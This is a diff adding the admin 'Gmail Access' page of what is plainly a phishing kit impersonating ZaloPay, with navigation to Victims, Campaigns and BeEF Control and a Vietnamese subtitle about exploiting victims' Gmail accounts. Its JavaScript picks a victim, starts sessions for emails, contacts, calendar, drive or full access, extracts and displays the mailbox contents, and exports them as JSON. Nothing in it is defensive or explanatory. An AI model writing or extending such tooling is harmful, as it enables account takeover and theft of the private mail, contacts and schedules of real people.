@@ -1,0 +1,696 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gmail Access - ZaloPay Admin</title>
+    
+    <!-- Favicon -->
+    <link rel="icon" type="image/x-icon" href="/favicon.ico">
+    
+    <!-- Bootstrap CSS -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    
+    <!-- Font Awesome -->
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    
+    <!-- Custom CSS -->
+    <link href="/css/admin.css" rel="stylesheet">
+    
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+</head>
+<body>
+    <!-- Navigation -->
+    <nav class="navbar navbar-expand-lg navbar-dark bg-dark">
+        <div class="container-fluid">
+            <a class="navbar-brand d-flex align-items-center" href="/admin/dashboard.html">
+                <img src="/images/zalopay-logo.png" alt="ZaloPay" height="32" class="me-2">
+                <span class="fw-bold">ZaloPay Admin</span>
+            </a>
+            
+            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">
+                <span class="navbar-toggler-icon"></span>
+            </button>
+            
+            <div class="collapse navbar-collapse" id="navbarNav">
+                <ul class="navbar-nav me-auto">
+                    <li class="nav-item">
+                        <a class="nav-link" href="/admin/dashboard.html">
+                            <i class="fas fa-tachometer-alt me-1"></i>Dashboard
+                        </a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="/admin/victims.html">
+                            <i class="fas fa-users me-1"></i>Victims
+                        </a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="/admin/campaigns.html">
+                            <i class="fas fa-bullhorn me-1"></i>Campaigns
+                        </a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link active" href="/admin/gmail.html">
+                            <i class="fas fa-envelope me-1"></i>Gmail Access
+                        </a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="/admin/beef.html">
+                            <i class="fas fa-bug me-1"></i>BeEF Control
+                        </a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="/admin/logs.html">
+                            <i class="fas fa-list-alt me-1"></i>Activity Logs
+                        </a>
+                    </li>
+                </ul>
+                
+                <ul class="navbar-nav">
+                    <li class="nav-item dropdown">
+                        <a class="nav-link dropdown-toggle" href="#" id="userDropdown" role="button" data-bs-toggle="dropdown">
+                            <i class="fas fa-user-circle me-1"></i>
+                            <span id="userName">Admin User</span>
+                        </a>
+                        <ul class="dropdown-menu dropdown-menu-end">
+                            <li><a class="dropdown-item" href="/admin/profile.html">
+                                <i class="fas fa-user me-2"></i>Profile
+                            </a></li>
+                            <li><a class="dropdown-item" href="/admin/settings.html">
+                                <i class="fas fa-cog me-2"></i>Settings
+                            </a></li>
+                            <li><hr class="dropdown-divider"></li>
+                            <li><a class="dropdown-item" href="#" onclick="logout()">
+                                <i class="fas fa-sign-out-alt me-2"></i>Logout
+                            </a></li>
+                        </ul>
+                    </li>
+                </ul>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Main Content -->
+    <div class="container-fluid py-4">
+        <!-- Page Header -->
+        <div class="row mb-4">
+            <div class="col-12">
+                <div class="d-flex justify-content-between align-items-center">
+                    <div>
+                        <h1 class="h3 mb-1">Gmail Access</h1>
+                        <p class="text-muted mb-0">Truy cập và khai thác tài khoản Gmail của nạn nhân</p>
+                    </div>
+                    <div class="d-flex gap-2">
+                        <button class="btn btn-outline-primary" onclick="refreshGmailData()">
+                            <i class="fas fa-sync-alt me-1"></i>Refresh
+                        </button>
+                        <button class="btn btn-outline-success" onclick="exportGmailData()">
+                            <i class="fas fa-download me-1"></i>Export
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Gmail Access Controls -->
+        <div class="row mb-4">
+            <div class="col-12">
+                <div class="card border-0 shadow-sm">
+                    <div class="card-header bg-white border-0">
+                        <h5 class="card-title mb-0">Access Controls</h5>
+                    </div>
+                    <div class="card-body">
+                        <div class="row g-3">
+                            <div class="col-md-4">
+                                <label for="victimSelect" class="form-label">Select Victim</label>
+                                <select class="form-select" id="victimSelect">
+                                    <option value="">Choose a victim...</option>
+                                </select>
+                            </div>
+                            <div class="col-md-4">
+                                <label for="accessType" class="form-label">Access Type</label>
+                                <select class="form-select" id="accessType">
+                                    <option value="emails">Emails</option>
+                                    <option value="contacts">Contacts</option>
+                                    <option value="calendar">Calendar</option>
+                                    <option value="drive">Drive</option>
+                                    <option value="full">Full Access</option>
+                                </select>
+                            </div>
+                            <div class="col-md-4">
+                                <label for="accessDuration" class="form-label">Duration</label>
+                                <select class="form-select" id="accessDuration">
+                                    <option value="1">1 hour</option>
+                                    <option value="6">6 hours</option>
+                                    <option value="24">24 hours</option>
+                                    <option value="168">1 week</option>
+                                </select>
+                            </div>
+                        </div>
+                        <div class="row mt-3">
+                            <div class="col-12">
+                                <button class="btn btn-primary" onclick="initiateGmailAccess()">
+                                    <i class="fas fa-key me-2"></i>Initiate Gmail Access
+                                </button>
+                                <button class="btn btn-outline-warning" onclick="testConnection()">
+                                    <i class="fas fa-plug me-2"></i>Test Connection
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Active Sessions -->
+        <div class="row mb-4">
+            <div class="col-12">
+                <div class="card border-0 shadow-sm">
+                    <div class="card-header bg-white border-0">
+                        <h5 class="card-title mb-0">Active Gmail Sessions</h5>
+                    </div>
+                    <div class="card-body">
+                        <div id="activeSessionsList">
+                            <div class="text-center py-4">
+                                <div class="spinner-border text-primary" role="status">
+                                    <span class="visually-hidden">Loading...</span>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Gmail Data Viewer -->
+        <div class="row">
+            <div class="col-xl-8">
+                <div class="card border-0 shadow-sm">
+                    <div class="card-header bg-white border-0">
+                        <div class="d-flex justify-content-between align-items-center">
+                            <h5 class="card-title mb-0">Gmail Data</h5>
+                            <div class="btn-group btn-group-sm" role="group">
+                                <input type="radio" class="btn-check" name="dataType" id="dataEmails" autocomplete="off" checked>
+                                <label class="btn btn-outline-primary" for="dataEmails">Emails</label>
+                                
+                                <input type="radio" class="btn-check" name="dataType" id="dataContacts" autocomplete="off">
+                                <label class="btn btn-outline-primary" for="dataContacts">Contacts</label>
+                                
+                                <input type="radio" class="btn-check" name="dataType" id="dataCalendar" autocomplete="off">
+                                <label class="btn btn-outline-primary" for="dataCalendar">Calendar</label>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="card-body">
+                        <div id="gmailDataViewer">
+                            <div class="text-center py-4 text-muted">
+                                Select a victim and initiate access to view Gmail data
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="col-xl-4">
+                <div class="card border-0 shadow-sm">
+                    <div class="card-header bg-white border-0">
+                        <h5 class="card-title mb-0">Intelligence Analysis</h5>
+                    </div>
+                    <div class="card-body">
+                        <div id="intelligenceAnalysis">
+                            <div class="text-center py-4 text-muted">
+                                No analysis available
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Gmail Access Modal -->
+    <div class="modal fade" id="gmailAccessModal" tabindex="-1">
+        <div class="modal-dialog modal-lg">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h5 class="modal-title">Gmail Access Status</h5>
+                    <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
+                </div>
+                <div class="modal-body">
+                    <div id="gmailAccessStatus">
+                        <!-- Status will be loaded here -->
+                    </div>
+                </div>
+                <div class="modal-footer">
+                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
+                    <button type="button" class="btn btn-primary" onclick="extractGmailData()">Extract Data</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Email Viewer Modal -->
+    <div class="modal fade" id="emailViewerModal" tabindex="-1">
+        <div class="modal-dialog modal-xl">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h5 class="modal-title">Email Viewer</h5>
+                    <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
+                </div>
+                <div class="modal-body">
+                    <div id="emailViewerContent">
+                        <!-- Email content will be loaded here -->
+                    </div>
+                </div>
+                <div class="modal-footer">
+                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
+                    <button type="button" class="btn btn-primary" onclick="downloadEmail()">Download</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Bootstrap JS -->
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+    
+    <!-- Custom JS -->
+    <script src="/js/admin.js"></script>
+    <script src="/js/gmail-websocket.js"></script>
+    
+    <script>
+        // Initialize Gmail page
+        document.addEventListener('DOMContentLoaded', function() {
+            initializeGmailPage();
+        });
+
+        function initializeGmailPage() {
+            loadVictims();
+            loadActiveSessions();
+            initializeWebSocket();
+        }
+
+        function loadVictims() {
+            fetch('/api/admin/victims/')
+                .then(response => response.json())
+                .then(data => {
+                    if (data.success) {
+                        const select = document.getElementById('victimSelect');
+                        select.innerHTML = '<option value="">Choose a victim...</option>';
+                        
+                        data.victims.forEach(victim => {
+                            const option = document.createElement('option');
+                            option.value = victim.victim_id;
+                            option.textContent = `${victim.personal_info?.full_name || 'Unknown'} (${victim.email})`;
+                            select.appendChild(option);
+                        });
+                    }
+                })
+                .catch(error => {
+                    console.error('Error loading victims:', error);
+                });
+        }
+
+        function loadActiveSessions() {
+            fetch('/api/admin/gmail/active-sessions')
+                .then(response => response.json())
+                .then(data => {
+                    if (data.success) {
+                        displayActiveSessions(data.sessions);
+                    }
+                })
+                .catch(error => {
+                    console.error('Error loading active sessions:', error);
+                });
+        }
+
+        function displayActiveSessions(sessions) {
+            const container = document.getElementById('activeSessionsList');
+            
+            if (sessions.length === 0) {
+                container.innerHTML = '<div class="text-center py-4 text-muted">No active Gmail sessions</div>';
+                return;
+            }
+
+            container.innerHTML = sessions.map(session => `
+                <div class="session-item d-flex align-items-center justify-content-between p-3 border rounded mb-2">
+                    <div>
+                        <h6 class="mb-1">${session.victim_name}</h6>
+                        <small class="text-muted">${session.victim_email}</small>
+                    </div>
+                    <div class="text-end">
+                        <span class="badge bg-${session.status === 'active' ? 'success' : 'warning'}">${session.status}</span>
+                        <br>
+                        <small class="text-muted">${formatTimeAgo(session.created_at)}</small>
+                    </div>
+                    <div class="btn-group btn-group-sm">
+                        <button class="btn btn-outline-primary" onclick="viewSession('${session.session_id}')">
+                            <i class="fas fa-eye"></i>
+                        </button>
+                        <button class="btn btn-outline-danger" onclick="terminateSession('${session.session_id}')">
+                            <i class="fas fa-stop"></i>
+                        </button>
+                    </div>
+                </div>
+            `).join('');
+        }
+
+        function initiateGmailAccess() {
+            const victimId = document.getElementById('victimSelect').value;
+            const accessType = document.getElementById('accessType').value;
+            const duration = document.getElementById('accessDuration').value;
+
+            if (!victimId) {
+                showNotification('Please select a victim', 'warning');
+                return;
+            }
+
+            const accessData = {
+                victim_id: victimId,
+                access_type: accessType,
+                duration: parseInt(duration)
+            };
+
+            fetch('/api/admin/gmail/access', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(accessData)
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    showNotification('Gmail access initiated successfully', 'success');
+                    displayGmailAccessStatus(data);
+                    $('#gmailAccessModal').modal('show');
+                } else {
+                    showNotification('Failed to initiate Gmail access', 'error');
+                }
+            })
+            .catch(error => {
+                console.error('Gmail access error:', error);
+                showNotification('Gmail access failed', 'error');
+            });
+        }
+
+        function displayGmailAccessStatus(data) {
+            const statusHtml = `
+                <div class="row">
+                    <div class="col-md-6">
+                        <h6>Access Information</h6>
+                        <table class="table table-sm">
+                            <tr><td><strong>Victim:</strong></td><td>${data.victim_name}</td></tr>
+                            <tr><td><strong>Email:</strong></td><td>${data.victim_email}</td></tr>
+                            <tr><td><strong>Access Type:</strong></td><td>${data.access_type}</td></tr>
+                            <tr><td><strong>Status:</strong></td><td><span class="badge bg-${data.status === 'success' ? 'success' : 'warning'}">${data.status}</span></td></tr>
+                        </table>
+                    </div>
+                    <div class="col-md-6">
+                        <h6>Session Details</h6>
+                        <table class="table table-sm">
+                            <tr><td><strong>Session ID:</strong></td><td>${data.session_id}</td></tr>
+                            <tr><td><strong>Duration:</strong></td><td>${data.duration} hours</td></tr>
+                            <tr><td><strong>Expires:</strong></td><td>${new Date(data.expires_at).toLocaleString()}</td></tr>
+                            <tr><td><strong>Created:</strong></td><td>${new Date(data.created_at).toLocaleString()}</td></tr>
+                        </table>
+                    </div>
+                </div>
+            `;
+            document.getElementById('gmailAccessStatus').innerHTML = statusHtml;
+        }
+
+        function extractGmailData() {
+            const victimId = document.getElementById('victimSelect').value;
+            const dataType = document.querySelector('input[name="dataType"]:checked').value;
+
+            fetch('/api/admin/gmail/extract', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    victim_id: victimId,
+                    data_type: dataType
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    showNotification('Gmail data extraction started', 'success');
+                    displayGmailData(data.data, dataType);
+                } else {
+                    showNotification('Failed to extract Gmail data', 'error');
+                }
+            })
+            .catch(error => {
+                console.error('Gmail extraction error:', error);
+                showNotification('Gmail extraction failed', 'error');
+            });
+        }
+
+        function displayGmailData(data, dataType) {
+            const viewer = document.getElementById('gmailDataViewer');
+            
+            if (dataType === 'emails') {
+                displayEmails(data);
+            } else if (dataType === 'contacts') {
+                displayContacts(data);
+            } else if (dataType === 'calendar') {
+                displayCalendar(data);
+            }
+        }
+
+        function displayEmails(emails) {
+            const viewer = document.getElementById('gmailDataViewer');
+            
+            if (emails.length === 0) {
+                viewer.innerHTML = '<div class="text-center py-4 text-muted">No emails found</div>';
+                return;
+            }
+
+            viewer.innerHTML = `
+                <div class="email-list">
+                    ${emails.map(email => `
+                        <div class="email-item p-3 border rounded mb-2 cursor-pointer" onclick="viewEmail('${email.id}')">
+                            <div class="d-flex justify-content-between align-items-start">
+                                <div class="flex-grow-1">
+                                    <h6 class="mb-1">${email.subject}</h6>
+                                    <p class="text-muted mb-1">From: ${email.from}</p>
+                                    <p class="text-muted mb-0">${email.snippet}</p>
+                                </div>
+                                <div class="text-end">
+                                    <small class="text-muted">${new Date(email.date).toLocaleDateString()}</small>
+                                    <br>
+                                    <span class="badge bg-${email.important ? 'danger' : 'secondary'}">${email.important ? 'Important' : 'Normal'}</span>
+                                </div>
+                            </div>
+                        </div>
+                    `).join('')}
+                </div>
+            `;
+        }
+
+        function displayContacts(contacts) {
+            const viewer = document.getElementById('gmailDataViewer');
+            
+            if (contacts.length === 0) {
+                viewer.innerHTML = '<div class="text-center py-4 text-muted">No contacts found</div>';
+                return;
+            }
+
+            viewer.innerHTML = `
+                <div class="contacts-list">
+                    ${contacts.map(contact => `
+                        <div class="contact-item p-3 border rounded mb-2">
+                            <div class="d-flex align-items-center">
+                                <div class="contact-avatar bg-primary text-white rounded-circle d-flex align-items-center justify-content-center me-3">
+                                    ${contact.name ? contact.name.charAt(0).toUpperCase() : '?'}
+                                </div>
+                                <div class="flex-grow-1">
+                                    <h6 class="mb-1">${contact.name || 'Unknown'}</h6>
+                                    <p class="text-muted mb-0">${contact.email}</p>
+                                </div>
+                                <div class="text-end">
+                                    <small class="text-muted">${contact.relationship || 'Unknown'}</small>
+                                </div>
+                            </div>
+                        </div>
+                    `).join('')}
+                </div>
+            `;
+        }
+
+        function displayCalendar(events) {
+            const viewer = document.getElementById('gmailDataViewer');
+            
+            if (events.length === 0) {
+                viewer.innerHTML = '<div class="text-center py-4 text-muted">No calendar events found</div>';
+                return;
+            }
+
+            viewer.innerHTML = `
+                <div class="calendar-list">
+                    ${events.map(event => `
+                        <div class="event-item p-3 border rounded mb-2">
+                            <div class="d-flex justify-content-between align-items-start">
+                                <div class="flex-grow-1">
+                                    <h6 class="mb-1">${event.summary}</h6>
+                                    <p class="text-muted mb-1">${event.description || 'No description'}</p>
+                                    <p class="text-muted mb-0">Location: ${event.location || 'Not specified'}</p>
+                                </div>
+                                <div class="text-end">
+                                    <small class="text-muted">${new Date(event.start).toLocaleString()}</small>
+                                    <br>
+                                    <span class="badge bg-${event.status === 'confirmed' ? 'success' : 'warning'}">${event.status}</span>
+                                </div>
+                            </div>
+                        </div>
+                    `).join('')}
+                </div>
+            `;
+        }
+
+        function viewEmail(emailId) {
+            fetch(`/api/admin/gmail/email/${emailId}`)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.success) {
+                        displayEmailContent(data.email);
+                        $('#emailViewerModal').modal('show');
+                    }
+                })
+                .catch(error => {
+                    console.error('Error loading email:', error);
+                    showNotification('Failed to load email', 'error');
+                });
+        }
+
+        function displayEmailContent(email) {
+            const content = `
+                <div class="email-header mb-4">
+                    <h4>${email.subject}</h4>
+                    <div class="row">
+                        <div class="col-md-6">
+                            <p><strong>From:</strong> ${email.from}</p>
+                            <p><strong>To:</strong> ${email.to}</p>
+                        </div>
+                        <div class="col-md-6">
+                            <p><strong>Date:</strong> ${new Date(email.date).toLocaleString()}</p>
+                            <p><strong>Importance:</strong> <span class="badge bg-${email.important ? 'danger' : 'secondary'}">${email.important ? 'Important' : 'Normal'}</span></p>
+                        </div>
+                    </div>
+                </div>
+                <div class="email-body">
+                    <div class="border rounded p-3">
+                        ${email.body}
+                    </div>
+                </div>
+            `;
+            document.getElementById('emailViewerContent').innerHTML = content;
+        }
+
+        function testConnection() {
+            showNotification('Testing Gmail connection...', 'info');
+            
+            fetch('/api/admin/gmail/test-connection', {
+                method: 'POST'
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    showNotification('Gmail connection test successful', 'success');
+                } else {
+                    showNotification('Gmail connection test failed', 'error');
+                }
+            })
+            .catch(error => {
+                console.error('Connection test error:', error);
+                showNotification('Connection test failed', 'error');
+            });
+        }
+
+        function exportGmailData() {
+            const victimId = document.getElementById('victimSelect').value;
+            
+            if (!victimId) {
+                showNotification('Please select a victim', 'warning');
+                return;
+            }
+
+            fetch('/api/admin/gmail/export', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    victim_id: victimId,
+                    format: 'json'
+                })
+            })
+            .then(response => response.blob())
+            .then(blob => {
+                const url = window.URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = `gmail_data_${victimId}.json`;
+                document.body.appendChild(a);
+                a.click();
+                window.URL.revokeObjectURL(url);
+                document.body.removeChild(a);
+                showNotification('Gmail data exported successfully', 'success');
+            })
+            .catch(error => {
+                console.error('Export error:', error);
+                showNotification('Export failed', 'error');
+            });
+        }
+
+        function refreshGmailData() {
+            loadActiveSessions();
+            showNotification('Gmail data refreshed', 'success');
+        }
+
+        function formatTimeAgo(timestamp) {
+            const now = new Date();
+            const time = new Date(timestamp);
+            const diff = now - time;
+            
+            const minutes = Math.floor(diff / 60000);
+            const hours = Math.floor(diff / 3600000);
+            const days = Math.floor(diff / 86400000);
+            
+            if (minutes < 1) return 'Just now';
+            if (minutes < 60) return `${minutes}m ago`;
+            if (hours < 24) return `${hours}h ago`;
+            return `${days}d ago`;
+        }
+
+        function showNotification(message, type = 'info') {
+            const notification = document.createElement('div');
+            notification.className = `alert alert-${type} alert-dismissible fade show position-fixed`;
+            notification.style.cssText = 'top: 20px; right: 20px; z-index: 9999; min-width: 300px;';
+            notification.innerHTML = `
+                ${message}
+                <button type="button" class="btn-close" data-bs-dismiss="alert"></button>
+            `;
+            
+            document.body.appendChild(notification);
+            
+            setTimeout(() => {
+                if (notification.parentNode) {
+                    notification.remove();
+                }
+            }, 5000);
+        }
+
+        function logout() {
+            if (confirm('Are you sure you want to logout?')) {
+                localStorage.removeItem('admin_token');
+                localStorage.removeItem('admin_user');
+                window.location.href = '/admin/login.html';
+            }
+        }
+    </script>
+</body>
+</html>
